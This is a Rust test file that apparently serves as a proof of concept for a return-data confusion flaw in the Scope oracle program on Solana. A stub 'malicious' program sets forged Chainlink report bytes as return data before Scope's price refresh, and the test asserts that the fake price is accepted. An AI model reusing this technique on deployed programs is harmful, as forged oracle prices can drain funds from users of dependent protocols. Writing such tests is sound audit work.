use std::str::FromStr;

use anchor_lang::prelude::*;
use anchor_lang::{InstructionData, ToAccountMetas};
use scope::anchor_lang as _; // ensure features
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::program_pack::Pack;
use solana_program::pubkey::Pubkey;
use solana_program_test::{processor, ProgramTest};
use solana_sdk::account::Account;
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::transaction::Transaction;
use solana_sdk::{hash::Hash, system_instruction};

// A tiny malicious program that sets return data
mod malicious {
	use super::*;
	solana_program::declare_id!("9syk1g3Hn9hQ2L1H3iUXFJQvW5bKqrNsWXm2W7h1gFqv");

	pub fn processor(_program_id: &Pubkey, _accounts: &[AccountInfo], ix_data: &[u8]) -> solana_program::entrypoint::ProgramResult {
		use solana_program::program::set_return_data;
		use solana_program::program_error::ProgramError;

		if ix_data.len() < 4 {
			return Err(ProgramError::InvalidInstructionData);
		}
		let len = u32::from_le_bytes(ix_data[0..4].try_into().unwrap()) as usize;
		if ix_data.len() < 4 + len {
			return Err(ProgramError::InvalidInstructionData);
		}
		let malicious = &ix_data[4..4 + len];
		set_return_data(malicious);
		Ok(())
	}
}

// Helper to allocate zero-copy accounts with given size
fn create_alloc_account(owner: &Pubkey, size: usize, lamports: u64) -> Account {
	Account {
		lamports,
		data: vec![0u8; size],
		owner: *owner,
		executable: false,
		rent_epoch: 0,
	}
}

mod verifier_stub {
	use super::*;
	// Use the real Chainlink verifier program id so CPI from Scope succeeds
	solana_program::declare_id!("Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c");

	pub fn processor(_program_id: &Pubkey, _accounts: &[AccountInfo], _ix_data: &[u8]) -> solana_program::entrypoint::ProgramResult {
		// Do not set return data; just succeed.
		Ok(())
	}
}

#[tokio::test]
async fn test_return_data_confusion_with_injector_cpi() {
	// Set up test validator with Scope and the malicious injector
	let scope_program_id = scope::id();
	let mut pt = ProgramTest::new("scope", scope_program_id, processor!(scope::entry));
	pt.add_program("malicious", malicious::id(), processor!(malicious::processor));
	pt.add_program("verifier_stub", verifier_stub::id(), processor!(verifier_stub::processor));

	use scope::oracles::chainlink::chainlink_streams_itf::{ACCESS_CONTROLLER_PUBKEY, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID};

	// Pre-add fixed verifier accounts so CPI account lookup succeeds
	let add_ro = |pt: &mut ProgramTest, key: Pubkey| {
		pt.add_account(
			key,
			Account {
				lamports: 1_000_000,
				data: vec![],
				owner: solana_program::system_program::id(),
				executable: false,
				rent_epoch: 0,
			},
		);
	};
	add_ro(&mut pt, VERIFIER_CONFIG_PUBKEY);
	add_ro(&mut pt, ACCESS_CONTROLLER_PUBKEY);

	// Create a dummy config account owned by the verifier program id
	let config_account = Keypair::new();
	pt.add_account(
		config_account.pubkey(),
		Account {
			lamports: 1_000_000,
			data: vec![],
			owner: VERIFIER_PROGRAM_ID,
			executable: false,
			rent_epoch: 0,
		},
	);

	// Pre-create a price_info account to act as Chainlink feed id (mapping)
	let chainlink_feed_kp = Keypair::new();
	let chainlink_feed_pk = chainlink_feed_kp.pubkey();
	pt.add_account(
		chainlink_feed_pk,
		Account {
			lamports: 1_000_000,
			data: vec![],
			owner: solana_program::system_program::id(),
			executable: false,
			rent_epoch: 0,
		},
	);

	// Payer and banks client
	let (mut banks_client, payer, _recent_blockhash) = pt.start().await;
	let mut recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();

	// Create admin and PDAs
	let admin = Keypair::new();
	let feed_name = "test-feed".to_string();
	let (config_pda, _bump) = scope::utils::pdas::config_pubkey(&feed_name);

	// Precreate big zero-copy accounts owned by Scope
	let token_metadatas = Keypair::new();
	let oracle_twaps = Keypair::new();
	let oracle_prices = Keypair::new();
	let oracle_mappings = Keypair::new();

	// Fund and create accounts
	let rent = 10_000_000_000; // generous for tests
	let mut tx = Transaction::new_with_payer(
		&[
			system_instruction::transfer(&payer.pubkey(), &admin.pubkey(), 1_000_000_000),
			system_instruction::create_account(
				&payer.pubkey(),
				&token_metadatas.pubkey(),
				rent,
				(8 + scope::utils::consts::TOKEN_METADATA_SIZE) as u64,
				&scope_program_id,
			),
			system_instruction::create_account(
				&payer.pubkey(),
				&oracle_twaps.pubkey(),
				rent,
				(8 + scope::utils::consts::ORACLE_TWAPS_SIZE) as u64,
				&scope_program_id,
			),
			system_instruction::create_account(
				&payer.pubkey(),
				&oracle_prices.pubkey(),
				rent,
				(8 + scope::utils::consts::ORACLE_PRICES_SIZE) as u64,
				&scope_program_id,
			),
			system_instruction::create_account(
				&payer.pubkey(),
				&oracle_mappings.pubkey(),
				rent,
				(8 + scope::utils::consts::ORACLE_MAPPING_SIZE) as u64,
				&scope_program_id,
			),
		],
		Some(&payer.pubkey()),
	);
	tx.sign(&[&payer], recent_blockhash);
	banks_client.process_transaction(tx).await.unwrap();
	recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();

	// Initialize Scope
	let ix_data = scope::instruction::Initialize { feed_name: feed_name.clone() }.data();
	let init_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::Initialize {
			admin: admin.pubkey(),
			system_program: solana_program::system_program::id(),
			configuration: config_pda,
			token_metadatas: token_metadatas.pubkey(),
			oracle_twaps: oracle_twaps.pubkey(),
			oracle_prices: oracle_prices.pubkey(),
			oracle_mappings: oracle_mappings.pubkey(),
		}
		.to_account_metas(None),
		data: ix_data,
	};
	let mut tx2 = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
	tx2.sign(&[&payer, &admin], recent_blockhash);
	banks_client.process_transaction(tx2).await.unwrap();
	recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();

	// Configure a Chainlink mapping at index 0
	let token_index: u16 = 0;
	// Generic data for v3 expects confidence_factor as first 4 bytes; choose 50
	let mut generic_data = [0u8; 20];
	generic_data[..4].copy_from_slice(&50u32.to_le_bytes());

	let update_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::UpdateOracleMapping {
			admin: admin.pubkey(),
			configuration: config_pda,
			oracle_mappings: oracle_mappings.pubkey(),
			price_info: Some(chainlink_feed_pk),
		}
		.to_account_metas(None),
		data: scope::instruction::UpdateMapping {
			token: token_index,
			price_type: scope::oracles::OracleType::Chainlink.into(),
			twap_enabled: false,
			twap_source: 0,
			ref_price_index: u16::MAX,
			feed_name: feed_name.clone(),
			generic_data,
		}
		.data(),
	};

	let mut tx3 = Transaction::new_with_payer(&[update_ix], Some(&payer.pubkey()));
	tx3.sign(&[&payer, &admin], recent_blockhash);
	banks_client.process_transaction(tx3).await.unwrap();
	recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();

	// Build a malicious return data buffer that decodes as ReportDataV3 matching feed_id = chainlink_feed_pk
	use chainlink_streams_report::feed_id::ID as FeedID;
	use chainlink_streams_report::report::v3::ReportDataV3;
	use num_bigint::BigInt;

	let now_ts: u32 = 1_700_000_000u64 as u32;
	let report = ReportDataV3 {
		feed_id: FeedID(chainlink_feed_pk.to_bytes()),
		valid_from_timestamp: now_ts,
		observations_timestamp: now_ts,
		native_fee: BigInt::from(0u8),
		link_fee: BigInt::from(0u8),
		expires_at: now_ts.saturating_add(600),
		benchmark_price: BigInt::from(100_000_000_000_000_000u128),
		bid: BigInt::from(100_000_000_000_000_000u128),
		ask: BigInt::from(100_000_000_000_000_000u128),
	};
	let malicious_bytes = report.abi_encode().unwrap();

	// Prepare Anchor call data for Scope::refresh_chainlink_price.
	let serialized_chainlink_report: Vec<u8> = vec![1, 2, 3];

	// Accounts required by RefreshChainlinkPrice
	let user_pubkey = payer.pubkey();

	// Build the Anchor-encoded instruction data for refresh_chainlink_price
	let refresh_data = scope::instruction::RefreshChainlinkPrice {
		token: token_index,
		serialized_chainlink_report: serialized_chainlink_report.clone(),
	}
	.data();

	// Build the malicious instruction (sets return data only)
	let mut malicious_ix_data = Vec::with_capacity(4 + malicious_bytes.len());
	malicious_ix_data.extend_from_slice(&(malicious_bytes.len() as u32).to_le_bytes());
	malicious_ix_data.extend_from_slice(&malicious_bytes);
	let malicious_ix = Instruction {
		program_id: malicious::id(),
		accounts: vec![],
		data: malicious_ix_data,
	};

	// Build the scope refresh instruction
	let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
		user: user_pubkey,
		oracle_prices: oracle_prices.pubkey(),
		oracle_mappings: oracle_mappings.pubkey(),
		oracle_twaps: oracle_twaps.pubkey(),
		verifier_account: VERIFIER_CONFIG_PUBKEY,
		access_controller: ACCESS_CONTROLLER_PUBKEY,
		config_account: config_account.pubkey(),
		verifier_program_id: VERIFIER_PROGRAM_ID,
	};
	let refresh_ix = Instruction {
		program_id: scope_program_id,
		accounts: refresh_accounts.to_account_metas(None),
		data: refresh_data,
	};

	// Send [malicious sets return data, then scope refresh]
	let tx5 = Transaction::new_signed_with_payer(
		&[malicious_ix, refresh_ix],
		Some(&payer.pubkey()),
		&[&payer],
		recent_blockhash,
	);
	banks_client.process_transaction(tx5).await.unwrap();

	// Fetch OraclePrices and assert the first entry updated (non-zero)
	let acct = banks_client
		.get_account(oracle_prices.pubkey())
		.await
		.unwrap()
		.expect("oracle_prices account");
	let data = acct.data;
	assert!(data.len() >= 8 + 32 + 56);
	// Offset past discriminator (8) + oracle_mappings pubkey (32)
	let off = 8 + 32;
	let val = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
	let exp = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
	assert!(val > 0, "price value should be updated by malicious data");
	assert!(exp <= 18, "reasonable exponent");
}

